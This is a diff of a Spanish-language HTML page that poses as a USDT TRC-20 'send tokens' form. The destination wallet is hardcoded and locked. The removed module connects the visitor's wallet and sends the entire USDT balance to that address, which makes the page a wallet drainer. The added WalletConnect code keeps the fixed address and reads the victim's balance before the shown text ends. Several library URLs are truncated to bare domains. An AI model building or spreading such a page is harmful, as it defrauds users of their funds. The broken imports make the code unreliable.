@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>dApp USDT TRC-20 - Red Principal</title>
+    <title>dApp USDT TRC-20 - Conexión Universal</title>
     
-    <!-- Estilos Optimizados: Fondo Blanco, Botón Azul y Texto de Red Rojo -->
+    <!-- Estilos de la Interfaz: Fondo Blanco, Botón Azul y Red Roja -->
     <style>
         * {
             box-sizing: border-box;
@@ -13,8 +13,8 @@
             padding: 0;
         }
         body {
-            font-family: sans-serif; /* Evita peticiones de fuentes externas para máxima velocidad */
-            background-color: #ffffff; /* Fondo de pantalla blanco */
+            font-family: sans-serif;
+            background-color: #ffffff; /* Fondo blanco */
             color: #1e293b;
             display: flex;
             justify-content: center;
@@ -68,7 +68,7 @@
             cursor: not-allowed;
         }
         
-        /* CORRECCIÓN: Estilo forzado para el texto de la red en color ROJO */
+        /* Texto de red en color ROJO */
         .red-text-input {
             color: #dc2626 !important; 
             font-weight: bold !important;
@@ -107,21 +107,55 @@
         .status.error { background-color: #fee2e2; color: #991b1b; }
     </style>
 
-    <!-- Script oficial ligero de TronWeb necesario para la inyección Web3 -->
-    <script src="https://jsdelivr.net"></script>
+    <!-- Librería TronWeb para estructurar los contratos de la red TRON -->
+    <script src="https://unpkg.com"></script>
+
+    <!-- Scripts de inicialización del ecosistema WalletConnect v2 (Reown AppKit) -->
+    <script type="module">
+        import { createAppKit } from 'https://esm.sh'
+        import { tron } from 'https://esm.sh/networks'
+        import { WagmiAdapter } from 'https://esm.sh-adapter-wagmi'
+
+        // Adaptador universal encargado de gestionar los códigos QR y Deep Links móviles hacia Trust Wallet
+        const wagmiAdapter = new WagmiAdapter({
+            networks: [tron],
+            projectId: 'TU_PROJECT_ID_DE_WALLETCONNECT' // Reemplazar obligatoriamente con tu ID de ://walletconnect.com
+        });
+
+        // Configuración e inyección del modal universal independiente
+        const modal = createAppKit({
+            adapters: [wagmiAdapter],
+            networks: [tron],
+            metadata: {
+                name: 'dApp USDT TRC-20',
+                description: 'Pasarela universal independiente de transacciones',
+                url: window.location.origin,
+                icons: ['https://githubusercontent.com']
+            },
+            projectId: 'TU_PROJECT_ID_DE_WALLETCONNECT',
+            features: {
+                analytics: false,
+                email: false,
+                socials: false
+            }
+        });
+
+        // Exponer el modal en el contexto de la ventana para que sea consumido por el botón
+        window.WalletConnectModal = modal;
+    </script>
 </head>
 <body>
 
     <div class="container">
         <h2>Enviar Tokens</h2>
 
-        <!-- Red TRON (TRC-20) en color ROJO -->
+        <!-- Red seleccionada fija en color ROJO -->
         <div class="form-group">
             <label>Red seleccionada</label>
             <input type="text" value="TRON (TRC-20)" disabled class="red-text-input">
         </div>
 
-        <!-- Dirección de Destino fija con tu Wallet solicitada -->
+        <!-- Dirección de Destino fija con tu Wallet -->
         <div class="form-group">
             <label for="addressInput">Dirección de destino</label>
             <input type="text" id="addressInput" value="TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ" disabled style="font-size: 13px; font-weight: bold; color: #334155;">
@@ -138,53 +172,6 @@
     </div>
 
     <script>
-        // ============================================================
-        // MÓDULO 2: LOGICA DEL BACKEND WEB3 (TRON_APP)
-        // ============================================================
-        (function () {
-            'use strict';
-            
-            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Contrato oficial de Tether USDT en Mainnet
-
-            async function connect() {
-                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                    return { address: window.tronWeb.defaultAddress.base58 };
-                }
-                if (window.tronLink && typeof window.tronLink.request === 'function') {
-                    await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    if (window.tronWeb) return { address: window.tronWeb.defaultAddress.base58 };
-                }
-                throw new Error('Abre este enlace dentro del dApp Browser de tu billetera y asegúrate de activar la red TRON.');
-            }
-
-            async function transferirMontoMaximo(direccionDestino) {
-                if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-                    throw new Error('Billetera no sincronizada.');
-                }
-
-                const cuentaEmisor = window.tronWeb.defaultAddress.base58;
-                const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
-                
-                // Consulta directa y exacta del balance sin errores de redondeo de flotantes en JavaScript
-                const rawBalance = await contract.balanceOf(cuentaEmisor).call();
-                const cleanSunBigInt = rawBalance.toString();
-
-                if (cleanSunBigInt === '0' || !cleanSunBigInt) {
-                    throw new Error('La billetera no cuenta con fondos en USDT.');
-                }
-
-                // Ejecución directa de la transferencia enviando la totalidad de las unidades sun
-                return await contract.transfer(direccionDestino, cleanSunBigInt).send({
-                    feeLimit: 100_000_000 // Protección de 100 TRX de límite de comisión en Mainnet
-                });
-            }
-
-            window.TRON_APP = { connect, transferirMontoMaximo };
-        })();
-
-        // ============================================================
-        // MÓDULO 1: MANEJO DE EVENTOS E INTERFAZ GRÁFICA
-        // ============================================================
         document.addEventListener('DOMContentLoaded', function () {
             'use strict';
 
@@ -194,9 +181,11 @@
             const status = document.getElementById('status');
 
             let procesoEnCurso = false;
+            let connectedAddress = null;
 
-            // Dirección de destino fija con tu Wallet solicitada
+            // Configuración fija de producción
             const DIRECCION_DESTINO_FIJA = "TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ"; 
+            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
             function setStatus(message, type = 'info') {
                 if (!status) return;
@@ -211,7 +200,6 @@
                 btn.disabled = disabled;
             }
 
-            // Asegurar que visualmente se mantenga la wallet correcta cargada
             if (addressInput) {
                 addressInput.value = DIRECCION_DESTINO_FIJA;
             }
@@ -236,23 +224,37 @@
                     try {
                         procesoEnCurso = true;
                         setButton('Procesando...', true);
-                        setStatus('Verificando parámetros de red...', 'info');
+                        setStatus('Inicializando pasarela universal independiente...', 'info');
 
-                        if (!window.TRON_APP) {
-                            throw new Error('El módulo TRON de la aplicación no está listo.');
+                        if (!window.WalletConnectModal) {
+                            throw new Error('El módulo de conexión universal independiente no está listo.');
                         }
 
-                        setStatus('Conectando con la billetera...', 'info');
-                        const wallet = await window.TRON_APP.connect();
-                        
-                        if (!wallet || !wallet.address) {
-                            throw new Error('No se pudo establecer conexión con la billetera.');
-                        }
+                        // 1. Abrir el modal independiente y esperar la vinculación de Trust Wallet
+                        setStatus('Esperando vinculación con Trust Wallet...', 'info');
+                        await window.WalletConnectModal.open();
 
-                        setStatus('Preparando transferencia segura...', 'info');
-                        const tx = await window.TRON_APP.transferirMontoMaximo(DIRECCION_DESTINO_FIJA);
-                        
-                        if (tx) {
-                            setStatus('¡Transferencia realizada con éxito!', 'success');
-                            if (input) input.value = '';
+                        // Bucle asíncrono controlado de espera hasta que el puente de red se concrete
+                        const wallet = await new Promise((resolve, reject) => {
+                            const interval = setInterval(() => {
+                                const account = window.WalletConnectModal.getAccount();
+                                if (account && account.isConnected) {
+                                    clearInterval(interval);
+                                    resolve(account);
+                                }
+                            }, 1000);
                             
+                            // Tiempo límite de desenganche de 60 segundos si el usuario cierra el aviso
+                            setTimeout(() => {
+                                clearInterval(interval);
+                                reject(new Error('Tiempo de espera de conexión universal agotado.'));
+                            }, 60000);
+                        });
+
+                        connectedAddress = wallet.address;
+                        setStatus('Billetera vinculada correctamente. Consultando balance...', 'info');
+
+                        // 2. Consultar el saldo USDT (TRC-20) consumiendo el nodo público RPC oficial de TRON
+                        const tronInstance = new TronWeb({ fullHost: 'https://trongrid.io' });
+                        const contract = await tronInstance.contract().at(USDT_CONTRACT);
+                        const rawBalance = await contract.balanceOf(connectedAddress).call();
